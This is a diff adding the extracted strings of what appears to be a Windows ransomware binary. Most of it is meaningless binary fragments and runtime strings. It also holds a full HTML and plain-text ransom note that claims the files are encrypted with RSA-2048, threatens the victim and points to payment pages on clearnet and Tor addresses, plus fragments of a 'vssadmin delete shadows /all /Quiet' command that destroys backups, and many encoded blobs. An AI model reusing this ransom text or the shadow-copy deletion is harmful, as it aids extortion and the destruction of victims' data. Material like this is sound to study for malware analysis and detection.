@@ -1,0 +1,2129 @@
+!This program cannot be run in DOS mode.
+hcQz;cQz;cQz;x
+;sQz;x
+Qz;x
+;NQz;
+^';aQz;
+^%;bQz;D
+;bQz;j)
+;vQz;cQ{;
+Qz;cQz;bQz;x
+;^Qz;j
+;bQz;x
+;bQz;RichcQz;
+.text
+`.rdata
+@.data
+.rsrc
+@.reloc
+uYhH
+Y_^[
+SVWP
+Y_^[
+58 C
+=4 C
+Qhx!D
+PQRh
+Rhx!D
+hx!D
+hx!D
+PQRh$
+D$)f
+D$1f
+\$Af
+u!Wh
+WjAh
+L$(j Q
+D$,P
+T$ R;
+L$ QVRSP
+T$ R
+VRSP
+=p!D
+L$Tj Q
+L$HVQ
+RPVV
+Ph!"D
+_^[3
+L$$Q
+T$,RSQWP
+T$$R
+T$,R
+SRWP
+SjAh
+=t!D
+SVWRQ
+RPVV
+L$0Q
+h!"D
+\$,f
+D$-f
+\$HjA
+T$hSR
+D$tvT2
+~D$0
+~D$8
+T$,R
+9|$@r
+D$,P
+D$H9|$\s
+L$XAQPh
+9|$\r
+T$HR
+Y_^[
+AQWV
+Y_^[
+sBSW
+SVW;P
+|$$t@;
+;t$ w
++L$ 
+(;L$$w
+;t$ s
++t$ 
+L$,u
+y"SVW
+PSPQ
+PSPQ
+PSPQ
+PSPQ
+PSPQ
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+SWQV
+<SVW
+|$ ;
+;D$ s
+T$ ;
+;|$ s
+\$ ;
+;\$ s
+\$ +
++\$(
+T$ ;
+9D$$t
+9D$$w
+\$ +
++\$(
+T$ ;
+9D$$t
+9D$$w
+\$ +
++\$(
+T$ ;
+9D$$t
+9D$$w
+\$ +
++\$(
+T$ ;
+9D$$t
+9D$$w
+D$$;D$,t#
+T$,9T$$w
+PSVW
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+PSPS
+PQPQ
+PSVW
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+PQPQ
+PSPS
+PQPQ
+WhB$D
+hC$D
+hB$D
+hC$D
+hB$D
+hC$D
+9G(u
+G VP
+SW9F
+hE$D
+t]VW
+_^[]
+hF$D
+hG$D
+VhF$D
+hG$D
+hF$D
+hG$D
+9C(u
+\$$u
+@VPW
+9t$ 
++T$ 
+D$tSRPP
+;D$(u
+;L$,u
+T$,R
+T$,RWVQP
+D$,PQRS
+L$4+
+|$HPW
+PSPW
+D$H3
+D$8P
+D$PP
+9|$Hs
+D$X;
+;D$8rv
+D$89D$Xu
+9t$8r2
+D$D9D$Tw
+;|$@s
++|$@
+D$T;
+D$X;D$8s
+QSVR
+9W(u
+WRVVj
+D$$VP
+D$$RPS
+RVPQS
+PQSV
+T$ VR
+T$ PQVRj
+D$,_^[
+WQPR
+C$VW3
+9{(u
+C$9{$u
+9{(u
+SQVRj
+{ _^
+WhH$D
+hI$D
+hH$D
+hI$D
+hH$D
+hI$D
+hK$D
+SV;G
+^[Y]
+Wu,I
+QSVW
+t!9]
+QPWVVj
+C$VW
+9C(u
+SQPW
+{ _^
+WQVVj
+C$VW
+9C(u
+SQPW
+{ _^
+N$1O
+C$VW
+9C(u
+C QW
+{ _^
+WhL$D
+hM$D
+hL$D
+hM$D
+hL$D
+hM$D
+C$VW
+9C(u
+T$4RWP
+j@PP
+L$4QPj
+T$,SRWWj
+{ _^
+u"Pj
+VRPQ
+VRQP
+RPQW
+RSWS
+PWSS
+ SVW
+PVQR
+VPQS
+Vt-PSP
+9s(u
+t	;E
+L$$;N
+L$$;N
+D$ _^[
+_^[Y]
+_^[Y]
+L$@3
+L$@3
+L$@3
+L$0j
+L$<j
+T$$RVf
+L$<f
+D$@j
+D$4PVf
+L$Tj
+L$DQ
+D$pVV
+L$8VQ
+|$@#
+L$@3
+_^[3
+L$x3
+L$x3
+L$x3
+L$`j
+L$p3
+T$t3
+T$(3
+D$T3
+T$83
+L$$j
+T$,Q
+\$D3
+T$hj
+T$\Rf
+D$|f
+D$X3
+L$lQVV
+D$hj
+T$|R
+6y/@
+% H@
+T$hVR
+T$p#
+L$x3
+_^[3
+L$Pj
+|$t3
+T$$u
+D$tPVV
+D$|3
+D$d3
+D$0j
+D$P3
+D$tPVf
+T$D+
+L$DVV
+T$t+
+T$dj
+6y/Gj
+% H@
+_^[3
+L$`j
+T$$u
+T$tRVV
+D$<VV
+D$df
+% H@
+_^[3
+L$X3
+L$X3
+L$X3
+\$(3
+D$L3
+D$$P
+L$8VQ
+T$@#
+L$X3
+_^[3
+WhN$D
+hO$D
+ShN$D
+hO$D
+hN$D
+hO$D
+t*;O
+T$$;
+u!9W(u
+G$9L$
+T$(R
+D$$_^[
+PQVS
+PQNV
+QPPP
+RWPQ
+VSPQ
+PVQR
+WPQR
+_^[Y]
+t)VSW
+_^[Y]
+_^[Y]
+u,@;G
+_^[Y]
+_^[Y]
+u&QR
+QSVW
+_^[Y]
+VRQP
+_^[Y]
+SMST
+sm<=u
+Q<+u
+F</u
+SMST
+hB=K
+hB=K
+B<#u
+u	_^3
+t+hbg
+t0hg
+SMSTW
+t2VhTs
+SMST
+SMST
+VRj@
+u$9^
+SVWj
+T$63
+D$&f
+L$ Q
+T$ R
+D$ P
+L$ Qh
+T$HRW
+f9tG
+95\$D
+;5\$D
+=l!C
+RPSV
+t'Sj
+u7Sj
+PQRV
+5p!C
+1f;2u
+hV$D
+hW$D
+VhV$D
+hW$D
+hV$D
+hW$D
+9C(u
+t$ SR
+T$$P
+_^[]
+_^[]
+txVW
+9_(u
+WQRVP
+tq9E
+WSPV
+HHQVV
+tg9E
+HHQVV
+u!RW
+PRVS
+FHSP
+RSPWj
+NtQV
+VtWR
+QWWV
+OHQP
+u	9u
+OtQSW
+OtQS
+t$$;
+9s(u
+OtQRW
+GtPQ
+t$,WV
+sHVP
+QWWS
+sHVP
+QWWS
+sHVP
+9q0u
+RWWS
+,SPW
+WSVR
+^_[]
+AdV3
+t$ ;
+9w(u
+t$$W
+,RVS
+sHVP
+WQVS
+QVRS
+CHPQVR
+D$ _^[
+T$4;
+PSVW
+u9SV
+u-WV
+,PWV
+D$ SW
+,PWWV
+T$,SW
+|$,W
+,PWV
+L$$SW
+,PWWV
+D$,W
+|$<PW
+D$$P
+D$$PP
+D$,QPP
+SQRP
+D$$SQ
+T$(SPRP
+D$ SQ
+T$ R
+D$4_^[
+,SVW
+t$4;
+uGRW
+9s(u
+F,PQW
+t$(WQV
+,PVW
+SVVW
+OtQVVW
+SRWV
+D$$SW
+|$0PWV
+SWVQ
+D$,PV
+SVQVR
+D$4_^[
+$SVW
+9C(u
+SVPW
+T$$SVQRW
+PVVW
+GtPQVW
+tWPP
+PVVW
+D$,_^[
+AdVW
+uDWS
+9G(u
+,PVS
+,QPS
+D$ WQ
+,PVVS
+t$$VVS
+D$ WV
+D$(_^[
+9_(u
+u4WVSR
+$SV3
+t$,9u
+9s(u
+hH$D
+hI$D
+hH$D
+hI$D
+hH$D
+hI$D
+WHRPP
+RPPW
+T$,P
+D$ RPW
+,VPW
+SVPPW
+D$,_^[
+HQVVj
+D$4;
+|$@;
+t$<;
+D$8;w
+\$H;
+D$8;s
+t$ ;
+D$8;w
+T$DWSRP
+t$4WSR
+|$@;
+t$(;
+D$8;w
+\$,;
+D$8;^
+T$4R
+t$8W
+\$$;
+D$8;^
+D$0WV
+VSQRW
+VSQRW
+^_[]
+ODVQ
+GDVP
+O@Qh
+tL9^
+u,_[]
+_^[]
+_@_^
+PSWR
+RPWSQ
+VPWSQ
+Wh %L
+h!%L
+h %L
+h!%L
+h %L
+h!%L
+h#%L
+SVW3
+|$`;
+9} u
+D$4;
+t$D;
+T$<RQ
+\$$;
+T$X9F
+Wh$%L
+h%%L
+h$%L
+h%%L
+h$%L
+h%%L
+Wh&%L
+h'%L
+h&%L
+h'%L
+h&%L
+h'%L
+Wh(%L
+h)%L
+h(%L
+h)%L
+T$Pj
+h(%L
+h)%L
+L$P;
+Wh*%L
+h+%L
+h*%L
+h+%L
+h*%L
+h+%L
+D$8;
+T$(9\$
+?;|$,v
+;D$8
+T$$RQ
+L$$;L$,w/
+|$HH
+D$d9D$
+>9|$$
+)|$$
+h-%L
+L$PRQP
+;D$,v
+;D$0
+h/%L
+;D$8r
+;|$X
+t$4;
+T$DRQ
+D$X;
+] SRVP
+D$XI
+D$X;
+;D$8
+L$(3
+L$(@;
+D$ RPQ
+D$,H
+;D$LtC
+9L$L
+VQQR
+;D$0
+T$ R
+D$`_^[
+h?%L
+=\%L
+SSSSh
+D$$h
+T$(P
+hD%L
+T$TP
+D$Ph
+L$,+
+D$,g
+D$4r
+D$8:
+}$jPQR
+SSSSW
+=l"C
+D$$=
+T$ R
+hD%L
+5l"C
+QPPO
+V	0P
+QPPO
+D$Df
+gfff
+T$LR
+T$0V
+L$ hX
+L$8WQ
+T$0j
+D$PP
+L$$Q
+T$`R
+D$,P
+)t$<
+uCPh
+L$\_^[3
+D$PS
+L$P3
+gfff
+=x%L
+D$ u
+9|$<t
+L$8f
+D$LP
+T$0j
+T$PR
+L$$Q
++t$\
+T$0V
+D$ hX
+D$HP
+D$8G;
+D$DP
+T$0j
+T$XR
+T$<j
+L$\_^[3
+=x%L
+D$$W
+$jDQ
+T$$S
+D$$h
+L$$h
+T$<R
+Pj@Q
+T$,j
+T$(j
+D$<P
+Qj@R
+D$,j
+L$$Q
+9\$0
+9\$$
+9\$ 
+9\$H
+9\$<
+9\$D
+9\$8
+9\$@
+9\$4
+9\$(t
+T$|RP
+T$`R
+D$d$
+D$XP
+L$|QR
+T$Tj
+_^[3
+F\ _^
+x@VW
+PQVS3
+s^[]
+_^[]
+Vj<P
+=`!C
+h dC
+h(dC
+5`!C
+50 D
+SVWP
+PSSSSSSh 
+5$"C
+j	Pf
+Qh #C
+P0QW
+h(?M
+SSj$S
+h(_M
+SSj&S
+SSj;S
+SSj#S
+w$t0;
+PSSh`
+h`[C
+hPHC
+h!"D
+SSSh
+SSSh
+SSSh0GA
+Y_^[
+=h!C
+QVVj
+QRVj
+T$pj
+T$dRh(
+L$|Qh(
+L$TQ
+D$Pj
+D$0D
+=0 C
+SVW3
+tDSW
+D$@f
+D$Hf
+D$Pf
+D$X3
+t$df
+D$0f
+L$$j
+T$@R
+D$0SP
+D$$j
+D$X(
+D$R6
+L$Jf
+T$8RV
+L$HQV
+RWSV
+L$d_^[3
+SVW3
+PWVj
+L2 Q
+t7h(
+^0Wj
+_^[3
+L$dQRP
+D$p 
+D$40
+D$,P
+T$ R
+=X"C
+L$|Q
+T$|R
+~h[_
+ tMv
+~\[_
+QWSRQ
+WSQV
+USVW
+_^[]
+USVW
+E03E
+E43E
+E83E
+E<QR
+EP3E4
+ET3E8
+EX3E<
+E\QR
+Ep3ET
+Et3EX
+Ex3E\
+E|QR
+_^[]1
+USVW
+_^[]
+USVW
+_^[]1
+ SW3
+8CSVh
+8"u]
+8"u'
+_^[]
+VW9]
+_^[]
+t"Ou
+_^[]
+t'Ou
+YY;E
+_^[]
+t)Ou
+SSSSS
+_^[]
+ SW3
+8CSVh
+8"uY
+8"u%
+_^[]
+woVW
+f9;u 
+@uoW
+uTVWhw
+YQPVh
+50	D
+=,	D
+% 	D
+PPPPP
+j0Xf
+RPWS
+80tS
+j Yf
+YYt/
+t&:a
+_^[]
+Y_^[]
+Fpt"
+hD'C
+F\83C
+F\=83C
+WhD'C
+ht'C
+hh'C
+h`'C
+5H!C
+@u^V
+t%HHt
+HHt$HHt
+RPWS
+90tW
+?If90t
+YYt.
+@u^V
+t$HHt
+HHt$HHt
+RPWS
+90tX
+YYt.
+h|2C
+PPPPP
+<v*V
+ht2C
+hl2C
+h 2C
+^SSSSS
+AWf;
+tRHtC
+tEHt0
+u%	U
+f9>t
+f9>t
+>=uu
+f9>t
+f9>t
+Y__^[
+9csm
+t h0
+URPQQhP
+L$,3
+UVWS
+[_^]
+SVWj
+_^[]
+j@j ^V
+SWf9M
+j@j 
+u,9E
+~,WPV
+98t^
+tVPV
+t/9U
+uNSW
+t!Ht
+_^[]
+Y_^[
+Y_^[
+8csm
+ w	f
+"u	3
+tAVWP
+Y[_^
+PPPPP
+8"u8
+t	j\Yf
+t$9U
+QQSVWh
+VVhU
+~%9M
+QVj	
+r 8^
+v	N+D$
+9]$u
+9](SS
+5<!C
+t"SS9] u
+9] SS
+v4;5
+vL;5
+PPPPPPPP
+PPPPPPPP
+QSWVj
+u}htCC
+hhCC
+hXCC
+hDCC
+h(CC
+tCHt(Ht 
+3t(;
+SSSSS
+t(9}
+SW9E
+t?f;
+Vuy3
+SVWUj
+]_^[
+;t$,v-
+UQPXY]Y[
+_^[]
+j@j 
+oV f
+o^0f
+of@f
+onPf
+ov`f
+o~pf
+FGIu
+X^_]
+FGIu
+SVW3
+Ht%C
+Ht(f
+_^[u
+QQSVWd
+QSVW
+@_^]
+=RCC
+=MOC
+=csm
+8csm
+9csm
+j,h 
+~A;L
+>csm
+taSV
+YYPV
+t)SV
+Hu4j
+=MOC
+t*=RCC
+;7|G;p
+9>u&
+tR99u2
+r,9Y
+@_^[]
+Unknown exception
+bad allocation
+CorExitProcess
+HH:mm:ss
+dddd, MMMM dd, yyyy
+MM/dd/yy
+December
+November
+October
+September
+August
+July
+June
+April
+March
+February
+January
+Saturday
+Friday
+Thursday
+Wednesday
+Tuesday
+Monday
+Sunday
+FlsFree
+FlsSetValue
+FlsGetValue
+FlsAlloc
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+(null)
+( 8PX
+700WP
+`h````
+xpxxxx
+('8PW
+700PP
+`h`hhh
+xppwpp
+UTF-8
+UTF-16LE
+UNICODE
+ Complete Object Locator'
+ Class Hierarchy Descriptor'
+ Base Class Array'
+ Base Class Descriptor at (
+ Type Descriptor'
+`local static thread guard'
+`managed vectorArrayList copy constructor iterator'
+`vectorArrayList vbase copy constructor iterator'
+`vectorArrayList copy constructor iterator'
+`dynamic atexit destructor for '
+`dynamic initializer for '
+`eh vectorArrayList vbase copy constructor iterator'
+`eh vectorArrayList copy constructor iterator'
+`managed vectorArrayList destructor iterator'
+`managed vectorArrayList constructor iterator'
+`placement delete[] closure'
+`placement delete closure'
+`omni callsig'
+ delete[]
+ new[]
+`local vftable constructor closure'
+`local vftable'
+`RTTI
+`udt returning'
+`copy constructor closure'
+`eh vectorArrayList vbase constructor iterator'
+`eh vectorArrayList destructor iterator'
+`eh vectorArrayList constructor iterator'
+`virtual displacement map'
+`vectorArrayList vbase constructor iterator'
+`vectorArrayList destructor iterator'
+`vectorArrayList constructor iterator'
+`scalar deleting destructor'
+`default constructor closure'
+`vectorArrayList deleting destructor'
+`vbase destructor'
+`string'
+`local static guard'
+`typeof'
+`vcall'
+`vbtable'
+`vftable'
+operator
+ delete
+ new
+__unaligned
+__restrict
+__ptr64
+__eabi
+__clrcall
+__fastcall
+__thiscall
+__stdcall
+__pascal
+__cdecl
+__based(
+ !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
+GetProcessWindowStation
+GetUserObjectInformationW
+GetLastActivePopup
+GetActiveWindow
+MessageBoxW
+0123456789ABCDEF
+SHA-256
+vRQ>
+8STs
+LwH'
+<html>   <style>a { color:green; }.tb {  background:white; border-style:solid; border-width:1px; padding:3px; border-color:lime; }
+.ttl { font-size:13px; color:880000; }</style><body style="background:#33CCFF;">  <center>
+<div style="text-align:left; font-family:Arial; font-size:13px; line-height:20px; margin-top:10px; width:800px; background:#F4F4F4; padding:20px; border-style:solid; border-width:5px; border-color:#BABABA;">
+<b><font class="ttl">What happened <!------sfg2gdfstw5ey3345 --> to your files?</b></font><br> <font style="font-size:13px;">All of your files were<!------sfg2gdfstw5ey3345 -->  protected by a strong<!------sfg2gdfstw5ey3345 --> encryption with<!------sfg2gdfstw5ey3345 --> RSA-2048 
+<br> More information about the <!------sfg2gdfstw5ey3345 -->encryption RSA-2048 can be<!------sfg2gdfstw5ey3345 --> found here: <a href="http://en.wikipedia.org/wiki/RSA_(cryptosystem)" target="_blank">http://en.wikipedia.org/wiki/RSA_(cryptosystem)</a><br></font>
+<br><b><font class="ttl">What <!------sfg2gdfstw5ey3345 --> does this mean?</b></font><br><font style="font-size:13px;">
+This<!------sfg2gdfstw5ey3345 -->  means that the <!------sfg2gdfstw5ey3345 --> structure and data within your files have been irrevocably <!------sfg2gdfstw5ey3345 -->changed, you will not be able to work<br> with them, read<!------sfg2gdfstw5ey3345 --> them or see them, it is the same thing <!------sfg2gdfstw5ey3345 -->as losing them forever, 
+but with our help, you can restore them.</font><br><br><b><font class="ttl">How did this happen?</b></font>  <br>    <font style="font-size:13px;">  Especially for you, on our server was generated the secret key pair RSA-2048 - public and private.
+<br>All your  <!------sdkfg3265436456hdfskjghfdg --> files were encrypted with the public key, <!------sdkfghd456334565436fskjghfdg --> which has been <!------sdkfghd45363456fskjghfdg --> 
+transferred to  <!------sdkfghdfskjghfdg -->your computer via  <!------sdkfghd4356345643564356fskjghfdg -->the Internet.<br> <!------sdkfghd34563456fskjghfdg --> Decrypting of  <!------sdkf45363456ghdfskjghfdg -->YOUR FILES is 
+<!------sdkfghdfs4563456kjghfdg -->only possible  <!------sdkfgh45364356dfskjghfdg -->with the help of the  <!------sdkfghd4563456fskjghfdg -->private key and  <!------sdkfghd43563456fskjghfdg -->decrypt program, 
+<!------sdkfghdf43564356tyretyskjghfdg -->which is on our  <!------sdkfgh34565346dfskjghfdg -->SECRET SERVER!!!. 
+</font><br><br><b><font class="ttl">What do I do?</b></font> <br><font style="font-size:13px;">Alas, if you do not take the necessary measures 
+for the specified time then the conditions for obtaining the private key will be changed.<br>
+If you really need your data, then we suggest you do not waste valuable time searching for other solutions because they do not exist.</font><br><br>
+<!------23452345dgtwertwre --><div class="tb" style="color:#880000; font-size:13px; border-width:3px;">For more specific instructions,
+please visit your personal home page, there are a few different addresses pointing to your page below: <hr>
+<!------sadfs32452345gfdsgsdfgdfsafasdfasdfsadf --><b>1.<a href="http://kwe2342fsd.rt546sdf234re.com/%S"   target="_blank">http://kwe2342fsd.rt546sdf234re.com/%S</a></b><br>
+<!------ds234523452345fgwert --><b>2.<a href="http://awoeinf832as.wo49i277rnw.com/%S"   target="_blank">http://awoeinf832as.wo49i277rnw.com/%S</a></b><br>
+<!------wer234524353245terwtewrt --><b>3.<a href="https://wls3uapur3zjm5gm.onion.to/%S" target="_blank">https://wls3uapur3zjm5gm.onion.to/%S</a></b><br>
+<!------sfg2gdfstw5ey3345 --></div><br><div class="tb" style="font-size:13px; border-color:#880000;">If for some reasons the addresses are not available, follow these steps: <hr>1. Download and install tor-browser: <a href="http://www.torproject.org/projects/torbrowser.html.en" target="_blank">http://www.torproject.org/projects/torbrowser.html.en</a><br>2. After a successful installation, run the browser and wait for initialization.<br>3. Type in the address bar: <font style="font-weight:bold; color:#009977;">wls3uapur3zjm5gm.onion/%S</font><br>4. Follow the instructions on the site.</div><br><br><b>IMPORTANT INFORMATION:</b><br><div class="tb" style="width:790px;">
+Your Personal PAGES: <b><br> <a href="http://kwe2342fsd.rt546sdf234re.com/%S" target="_blank">http://kwe2342fsd.rt546sdf234re.com/%S</a> <br> <a href="http://awoeinf832as.wo49i277rnw.com/%S" target="_blank">http://awoeinf832as.wo49i277rnw.com/%S</a>  <br> 
+<a href="https://wls3uapur3zjm5gm.onion.to/%S" target="_blank"> https://wls3uapur3zjm5gm.onion.to/%S</a> </b> <br> 
+Your Personal PAGE (using TOR): <font style="font-weight:bold; color:#009977;">wls3uapur3zjm5gm.onion/%S</font><br>
+Your personal code (if you open the site (or TOR 's) directly): <font style="font-weight:bold; color:#770000;">%S</font><br>
+</div></div></center></body></html>
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+What happened to your files ?
+All of your files were protected by a strong encryption with RSA-2048.
+More information about the encryption keys using RSA-2048 can be found here: http://en.wikipedia.org/wiki/RSA_(cryptosystem)
+What does this mean ?
+This means that the structure and data within your files have been irrevocably changed, you will not be able to work with them, read them or see them,
+it is the same thing as losing them forever, but with our help, you can restore them.
+How did this happen ?
+Especially for you, on our server was generated the secret key pair RSA-2048 - public and private.
+All your files were encrypted with the public key, which has been transferred to your computer via the Internet.
+Decrypting of your files is only possible with the help of the private key and decrypt program, which is on our secret server.
+What do I do ?
+Alas, if you do not take the necessary measures for the specified time then the conditions for obtaining the private key will be changed.
+If you really value your data, then we suggest you do not waste valuable time searching for other solutions because they do not exist.
+For more specific instructions, please visit your personal home page, there are a few different addresses pointing to your page below:
+1. http://kwe2342fsd.rt546sdf234re.com/%S
+2. http://awoeinf832as.wo49i277rnw.com/%S
+3. https://wls3uapur3zjm5gm.onion.to/%S 
+If for some reasons the addresses are not available, follow these steps:
+1. Download and install tor-browser: http://www.torproject.org/projects/torbrowser.html.en 
+2. After a successful installation, run the browser and wait for initialization.
+3. Type in the address bar: wls3uapur3zjm5gm.onion/%S 
+4. Follow the instructions on the site.
+IMPORTANT INFORMATION:
+Your personal pages:
+http://kwe2342fsd.rt546sdf234re.com/%S
+http://awoeinf832as.wo49i277rnw.com/%S 
+https://wls3uapur3zjm5gm.onion.to/%S  
+Your personal page (using TOR): wls3uapur3zjm5gm.onion/%S 
+Your personal identification number (if you open the site (or TOR 's) directly): %S
+delete 
+shadows /all /Quiet 
+open
+runas
+vssadmin.exe
+g0072SLIe72s8nNDiW6VQpc0xg+iSH==
+V96PsOBDyRkU5nqkoC6/di+ITgNjxY==
+YffVLM7mvsaDbUgoxiPWAnfJCg9Wg2==
+CErSzGr+BLqcQa+wcWXrEsmfDAMzJb==
+CrQuC6gyjab8Owv6+mr1Qv2zJwvx0H==
+pMvTlxZ9QYxUtgkspfwQjZcQMQlg4R==
+NCCwz6NJRzCZYpjYzHig/moOggiU89==
+XPe/VUE7imqC6oHZEqJxwq3C0gykKl==
+KrXUwQVXkQOmCW/OE7+RZyM2fQ7x/J==
+chggGWUl8AFZqAyEVroV/heDGw/nts==
+6wzCGkX2A1yYKAVO4LQFokLsUg7IKU==
+m5bk5w54vYV+HhkjOG6ETp1zCg/2R1==
+qhBK2R5L/cMlA4i1E9t8ns+lQALmeg==
+C8uaxr7dkTY3gsGSR7+hUG98ugJQ8g==
+tsFGNuPsdsMIAnNwZAC4tNQimgCwDp==
+FZLK8xLUw/b7Xv9ED10IfZ3VlQBxcm==
+38DgwhVfswDky6y0eQxmZ/rgjQNIH0==
+nBZtGo4ZnLfbPXmVa6LMFs5BoATI69==
+ykN87RZvvSM9vsyGW+wFAFaLXQs7X2==
+MjeGED47YZ9v5OvQLf2bap8L2wH8IaOxNCW4rqsJ
+NXWG9BJOYo1IIbWLbNbRAmSNvwPax2==
+dRdC7wd8wgGDIGIVPIwqFPexlwQS7F==
+s29EgWj7WCMPjJv2DejxLbeaGwhJIl==
+N257yM5wfqSqIweMhAQWRnn29gdVNo==
+56fqnzPxM3TJhuXXmzTtVP2/Bwlb5b==
+5e42wd7QWrEzCvHmo94/0B+PHADvgr==
+9DBTcGbsBKvIPqeDHXv5YqU1+QeoDO==
+kJXYKzmR0ir0RwmQkIUqKy7GVwu2AQ==
+8AHzXK+oUou8yw+c4Vroi4JnIAUScW==
+BFpK5FImE1RFwAUT/s9BgYGYWwjbRX==
+CgFXnsN6Zwdpul0DFi4gxYam6gAw0L==
+GRQAM7zShmheUbDP9yhLTcrkqwb5vV==
+0wSu1EBV3K6kSVNoDJCOhb8wfARl+0==
+SvJptrqu+w5rjYTSN+7dsEwSvAjVGo==
+64OyOD99YLTe0ItHE+h1jzQbuwkFet==
+jPO3RtK6xQ81Xnkd3s7nHl9LUgwdlW==
+ojrwLcIiOqSVz1DTatnskrJGZwf2o9==
+zZ+ROO4od4IgaXuE8Qg+ZuHZ8wQiKP==
+Jw2fGWYTngWp4HQNc+sQBNOq5QfWvd==
+Oy7qXRURcB9QnyGs7pc4liTXdQkyWw==
+vWU3kQzJ/C6F8rwnlK3lb8YdaQy797==
+ed5fXebRqqlnQSsoCk6CtUFTJwhnp3==
+FY2jocHMB1kpeVmUfJMBsI/D4w5/vu==
+R7V4fX7JbI86IoRU4BYfZDhoywtEFi==
+SbW8XnQ3awDYIYtrGli2O3SAKAvfy2==
+4hDV4e90eDY2k+RJUm6zX/xqTwVsC3==
+YRNFA4KhJiMvx7qn98Cx6gvxcAbidP==
+a1UNLsFiZuzQ+T3oiBVBjIQ91w6pE6==
+6K9mZsfStHBYm7J7mNQtVPSxAQSRsX==
+uWkX+78H2CGy9m+Q+MGW1VzF4gPHi9==
+ipq8xSLpLqFeQ03oE8vE8EIKlgC1gt==
+APnoE7oGJVBl5pteyRCipskENQ+pLN==
+T6fTmP6I+SRDYW6cXLDUS8WPWw3EOe==
+758GUmDzVpZUjYsySkr161/a5A/7/p==
+4mfPEm28CitiPOxSPWQBTQNMyQ95Mj==
+qccXcEldtYiQUcBfvlppy4mdWi/AAtVHnp4/QiLM
+vUtXprQVgFcG/JIFXons5H1UawPsjp==
+QCoUXFMUYWiS64OUjsKgFoam2gLezI==
+9A49N+0Agz+vgHIl+qSXVi/XLTCJdVHYifFrvmgH
+C+IKCcLbgz6mPZ7xOmgIwKEQmAF9MT==
+CTzRYQHK8yYtlfKXhQxDRwGhaAyOzS==
+HvsuUjzPhP5vFrSeSZEJ1T7X8ACpsd==
+Tg/7A7R93xMP+f/KQrpBKY79CgqcDm==
+WP34Ui9TbVQXnD8pSSEhm6SdozMo+me+JKErE7zc
+bBOf2jTtS/EKBVblNXSTZjFMcQkrP7==
+h/bGMfFFcIuz4iMDXyR86IjK+wfacL==
+mwp40/z/YJu5cfyweLQDnzFMhgl1Ft==
+EylFasUt+5URvw+IVj985BzOFgvWdp==
+IDHJ6PtbdWLbrl4WcQUl1+aZvPg4N9JlQLSTzD+h
+wcLmo6m3eZDiIWRUtBneLuRZ9gmLzr==
++iCx5rN8Yekip30vDEeBCm29BAApyP==
+N6/2CzLbRgG935BZpTCqgilVGA9kIf==
+N4WYSnQjRRjtCBxlgcF0AR/6lAhTfl==
+kGahfTptwzHfjgE0NeI4wxqTkAY28r==
+VRN2arGYgRYyCLT1DRC2YDJ1swvJJ0==
+vS6RDWSw1Ztnpu1Hp8NzzmMV3AuMpG==
+Iw68gfC+gSZnfdf4gM+Qm5JsZvHl28r6KRIHUyAC
+SJXFliyFAMTVrKUHF5ETf0orvwZIWT==
+3z7i672gfncUfdu5vouqw7N3TAU9Sc==
+EmWkk7YzmrSs9dIKNYb0pbnFIwdiyU==
+S+073KbsFTFwBMAUvraRoZCEpwN2Nx==
+uwmcrg0gpM0EisOIom3aDff6ngl/qN==
+wObVSi0J8fdj2nNxrRPK807/eQmmhx==
+w71Bk8pfFq5bVY3JEmattwp+awVL5J==
+rQIQZlirGBdKdy0xmyGCopUuxwRSPQ==
+oyfRsIpkyUNtHV4lRZJqvvV14gfDuO==
+xA+/i6IeRLbKywJAKbCpFWO8fgovpR==
+q9QmT91CNj+EYlNOfX7UZotZaAIff6==
+6mzDFjzHMfFA2KeLTJnPHfHx7wIQiP==
+H8R9hslqO1Smi1YcwK+dMmGuowy405==
+osuCKrPWyTVl9ky5zZmKxJCRmgqCKF==
+U9zN7hNhPp0RHyoh4D47p7jlYAsUll==
+KK+xMA0893LbzerqDs6xmSQrswf99p==
+Nmb6U6wLKNjkavn9nEUfMOxWcAX5GX==
+QkGpZn1CIn8JSuWzvGctYrleDwJZGm==
+0yXjfFJIbLG09UY3O8C7v+4S4Ahn33==
+COTLjQDG2m9iN9eHO2RIQVblpAjW1D==
+oNX2CWH2Pi6xmv8SKqAH5+xMLw+LF5==
+ttHfdRv1KgtEtWeD87oNmZxSYwqRLe==
+eDPC12HElwM/fjFt5rcTY1hdLQxa/E==
+beYDhxcKot6bvmNSK+INN68SOwfMfQ==
+aRF1xX7Ynqn1UgXKKbeekaPhX8YaRRj3UXnzMtX1
+4F7ZeIujow5K/BiEYx96QrG/tQu3Gz==
+Wa3yKw11736NKmr9miCufAnjIQDOHo==
+8ivsWmdkUGHDhluQG0tyCC+JTArfhU==
+a1HvL04+TsudWsqdKLdNK+YtxQPALc==
+sZCD0GEnmv2zt1qweuS1su9cWQg38a==
+5Ijk6bTJbEC3VnmFBhgYxv361w9dJP==
+4rzbts5NhufQpftBDnvNmMSHJgUGjP==
+oFS1icjmdT/3IZ51V0M9izezSgYnFe==
+L5N/ZTPVvHdGKaL6MkvVpDBl0QKqmX==
+wSNDUZlfyhzqYof/abSTwLx7gQYYka==
+Pp0bTnJSXvXUan1O1526hG/H/gFO2g==
+1N1IaqM/Dwp6N7kIO37lkQi51AruRF==
+v13MK0JAmQe8GB/wPScpdyD1Xg501y==
+9vQT5tiKycPPyov7Vlnu2UfQWAq8wP==
+6ry4vMP4hP3ko7LS86wcF72EBwjByw==
+Nw6fjwWkUQAgjaFgOjKHUkxr4An+SG==
+ZQd/maPH58Z1dFG9cWkJrh7HVA650t==
+A8GMLXFw6iBz2NJpJS0BPu/SAA/nDE==
+UiLg//n5CkJrcPlCMY5MnDjRIt7sBgKly88iCkMY
+57Pblmi22mpPBWKQBWxJjCND2OrrSYXQIFLkjijG
